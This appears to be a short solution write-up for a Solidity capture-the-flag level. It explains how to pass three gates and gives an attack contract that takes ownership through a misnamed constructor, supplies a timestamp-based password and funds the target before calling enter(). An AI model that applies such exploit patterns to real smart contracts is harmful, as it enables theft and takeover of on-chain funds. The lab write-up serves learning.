### Goals

Become entrant

### Exploit

We need to bypass all 3 gates;

Gate1: we need to set msg.sender as owner which can be done by calling `construct0r`

Gate2: we need to pass the `password` that will match `trick.checkPassword`

Gate3: the `GateKeeper` balance must be greater then 0.001 ether and sending ether to `owner` must fail

### Code

Deploy contract in Remix

```code
interface Gate {
    function enter() external;
    function construct0r() external;
    function createTrick() external;
    function getAllowance(uint256) external;
}

contract Gate3 {
    Gate t = Gate(0xc08A2C11E90700f99dC55b52B3b440296B1D35d4);

    function pwn() external payable {
        t.construct0r();
        t.createTrick();

        uint256 b = block.timestamp;

        t.getAllowance(b);
        address(t).call{value: 0.0011 ether}("");
        t.enter();
    }
}
```

Deploy contract and call `pwn()` along with sending 0.0011 eth.

Done!
